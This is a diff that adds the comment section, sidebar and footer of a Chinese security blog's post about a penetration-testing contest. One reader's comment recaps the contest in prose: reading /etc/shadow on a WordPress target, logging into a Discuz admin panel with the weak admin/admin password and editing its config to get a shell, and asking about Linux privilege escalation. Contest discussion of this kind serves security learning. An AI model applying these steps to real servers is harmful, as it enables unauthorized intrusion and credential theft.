+              <li class="comment-body" id="comment-1663">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/530777ddf6c92e2dd5c3b46d9ef18ef0.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://boke.tulongteam.com" target="_blank" rel="nofollow noopener">屠龙</a></div>
+                    <p>拿了第二名很不错了。</p>
+                    <span class="comment-time">时间: 2014-05-30 18:28</span>
+                    <span class="comment-reply"><a href="#comment-1663" onclick="reply_to('1663','屠龙')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1662">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.wanzaila.com" target="_blank" rel="nofollow noopener">万载</a></div>
+                    <p>牛B啊。</p>
+                    <span class="comment-time">时间: 2014-05-30 17:49</span>
+                    <span class="comment-reply"><a href="#comment-1662" onclick="reply_to('1662','万载')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1659">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/70a8934c7e87a70cdde07747e60ad06f.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">wilson</a></div>
+                    <p>先点赞~<br>1.第一个服务器 wordpress 我读了/etc/shadow 但是root破不出来  - - <br>音符牛说wrodpress 可以爆出wordpress的路径<br>2.第二个服务器 笑而不语 嘿嘿 <br>3.第三个服务器 那么简单 T_T 哭了 我就没去读robots.txt<br>discuz 据说是admin/admin 弱口令 直接去后台改配置文件拿shell<br>4.第四个服务器 eweb 那个在editor目录下 唯一的题windows系统 补丁打的全全的 没有搞到sa也 - -  <br>我也想知道 如何提权 linux  求教导</p>
+                    <span class="comment-time">时间: 2014-05-28 22:50</span>
+                    <span class="comment-reply"><a href="#comment-1659" onclick="reply_to('1659','wilson')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1652">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/a85c3d3674477dc0fcfa1b389f85b9d2.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://hackluom.net" target="_blank" rel="nofollow noopener">luom</a></div>
+                    <p>不错啊，是不是发现渗透这事细心很重要？</p>
+                    <span class="comment-time">时间: 2014-05-28 02:44</span>
+                    <span class="comment-reply"><a href="#comment-1652" onclick="reply_to('1652','luom')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1655">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@luom：嗯。。与思路一样重要</p>
+                    <span class="comment-time">时间: 2014-05-28 11:44</span>
+                    <span class="comment-reply"><a href="#comment-1655" onclick="reply_to('1655','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1648">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">彩色夏天</a></div>
+                    <p>学弟不哭～～</p>
+                    <span class="comment-time">时间: 2014-05-27 14:04</span>
+                    <span class="comment-reply"><a href="#comment-1648" onclick="reply_to('1648','彩色夏天')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1647">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">cmdshell</a></div>
+                    <p>大牛 膜拜之....</p>
+                    <span class="comment-time">时间: 2014-05-27 13:10</span>
+                    <span class="comment-reply"><a href="#comment-1647" onclick="reply_to('1647','cmdshell')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1644">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://sillymind.me" target="_blank" rel="nofollow noopener">mapleray</a></div>
+                    <p>又一个被key360坑了的人 = =握爪</p>
+                    <span class="comment-time">时间: 2014-05-27 08:13</span>
+                    <span class="comment-reply"><a href="#comment-1644" onclick="reply_to('1644','mapleray')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+<div class="type-post" id="pagination"><ol class="page-navigator">
+    
+</ol></div>
+
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="e5b02e14c62cfc04ee672c493953801ebcc4582f" />
+</div><div class="col-6">
+<img src="../captcha/image/e5b02e14c62cfc04ee672c493953801ebcc4582f/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="314" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="IuGW6e8I96AdUlH3NOZ9V4iM9KQjlrkgu24NEjJrxsOWsTvrPPWUSxlRu77uU3wy">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/wopus.html">wopus</a>
+        
+        <a rel="tag" href="../tag/Mysql.html">Mysql</a>
+        
+        <a rel="tag" href="../tag/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB.html">哈希长度扩展攻击</a>
+        
+        <a rel="tag" href="../tag/sec-news.html">sec-news</a>
+        
+        <a rel="tag" href="../tag/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6.html">备份文件</a>
+        
+        <a rel="tag" href="../tag/xss.html">xss</a>
+        
+        <a rel="tag" href="../tag/ChatGPT.html">ChatGPT</a>
+        
+        <a rel="tag" href="../tag/WAF.html">WAF</a>
+        
+        <a rel="tag" href="../tag/CSP.html">CSP</a>
+        
+        <a rel="tag" href="../tag/php-fpm.html">php-fpm</a>
+        
+        <a rel="tag" href="../tag/hashcat.html">hashcat</a>
+        
+        <a rel="tag" href="../tag/ImageMagick.html">ImageMagick</a>
+        
+        <a rel="tag" href="../tag/php.ini.html">php.ini</a>
+        
+        <a rel="tag" href="../tag/LD_PRELOAD.html">LD_PRELOAD</a>
+        
+        <a rel="tag" href="../tag/java%E5%AE%89%E5%85%A8.html">java安全</a>
+        
+        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a>
+        
+        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
+        
+        <a rel="tag" href="../tag/XDCTF.html">XDCTF</a>
+        
+        <a rel="tag" href="../tag/3ds.html">3ds</a>
+        
+        <a rel="tag" href="../tag/%E5%BA%93%E5%87%BD%E6%95%B0.html">库函数</a>
+        
+        <a rel="tag" href="../tag/apache.html">apache</a>
+        
+        <a rel="tag" href="../tag/%E6%BA%A2%E5%87%BA.html">溢出</a>
+        
+        <a rel="tag" href="../tag/goahead.html">goahead</a>
+        
+        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
+        
+        <a rel="tag" href="../tag/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html">上传漏洞</a>
+        
+        <a rel="tag" href="../tag/%E9%98%B2%E7%9B%97%E9%93%BE.html">防盗链</a>
+        
+        <a rel="tag" href="../tag/%E6%B5%8B%E8%AF%95.html">测试</a>
+        
+        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
+        
+        <a rel="tag" href="../tag/gh0st.html">gh0st</a>
+        
+        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
